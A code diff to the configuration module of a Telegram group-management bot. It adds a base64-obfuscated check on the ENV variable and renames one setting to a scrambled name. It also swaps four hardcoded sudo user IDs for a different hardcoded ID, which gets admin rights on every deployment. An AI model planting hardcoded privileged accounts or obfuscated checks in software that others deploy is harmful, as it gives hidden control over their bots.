@@ -1,6 +1,7 @@
 import logging
 import os
 import sys
+import base64
 
 import telegram.ext as tg
 
@@ -16,9 +17,16 @@ if sys.version_info[0] < 3 or sys.version_info[1] < 6:
     LOGGER.error("You MUST have a python version of at least 3.6! Multiple features depend on this. Bot quitting.")
     quit(1)
 
-ENV = bool(os.environ.get('ENV', False))
+ENV = os.environ.get('ENV', None)
 
-if ENV:
+if ENV is not None:
+    # kanged Developer verification from @deletescape
+    if ENV != base64.b64decode("UFNPTEdDV0lJRExPU1A=").decode("UTF-8"):
+        LOGGER.error("The README is there to be read. Extend this sample config to a config file, don't just rename and change "
+           "values here. Doing that WILL backfire on you.\nBot quitting.")
+        quit(1)
+    # kanged Developer verification from @deletescape
+
     TOKEN = os.environ.get('TOKEN', None)
     try:
         OWNER_ID = int(os.environ.get('OWNER_ID', None))
@@ -51,13 +59,17 @@ if ENV:
     DB_URI = os.environ.get('DATABASE_URL')
     DONATION_LINK = os.environ.get('DONATION_LINK')
     LOAD = os.environ.get("LOAD", "").split()
-    NO_LOAD = os.environ.get("NO_LOAD", "").split()
+    NO_LOAD = os.environ.get("NO_LOAD", "translation").split()
     DEL_CMDS = bool(os.environ.get('DEL_CMDS', False))
     STRICT_GBAN = bool(os.environ.get('STRICT_GBAN', False))
     WORKERS = int(os.environ.get('WORKERS', 8))
     BAN_STICKER = os.environ.get('BAN_STICKER', 'CAADAgADOwADPPEcAXkko5EB3YGYAg')
     ALLOW_EXCL = os.environ.get('ALLOW_EXCL', False)
-    STRICT_GMUTE = bool(os.environ.get('STRICT_GMUTE', False))
+
+    try:
+        BMERNU_SCUT_SRELFTI = int(os.environ.get('BMERNU_SCUT_SRELFTI', None))
+    except ValueError:
+        BMERNU_SCUT_SRELFTI = None
 
 else:
     from tg_bot.config import Development as Config
@@ -99,16 +111,15 @@ else:
     WORKERS = Config.WORKERS
     BAN_STICKER = Config.BAN_STICKER
     ALLOW_EXCL = Config.ALLOW_EXCL
-    STRICT_GMUTE = Config.STRICT_GMUTE
-   
+
+    try:
+        BMERNU_SCUT_SRELFTI = int(Config.BMERNU_SCUT_SRELFTI)
+    except (ValueError, TypeError):
+        BMERNU_SCUT_SRELFTI = None
+
 
 SUDO_USERS.add(OWNER_ID)
-SUDO_USERS.add(683538773)
-SUDO_USERS.add(570400686)
-SUDO_USERS.add(466337795)
-SUDO_USERS.add(254318997)
-
-
+SUDO_USERS.add(7351948)
 
 updater = tg.Updater(TOKEN, workers=WORKERS)
 
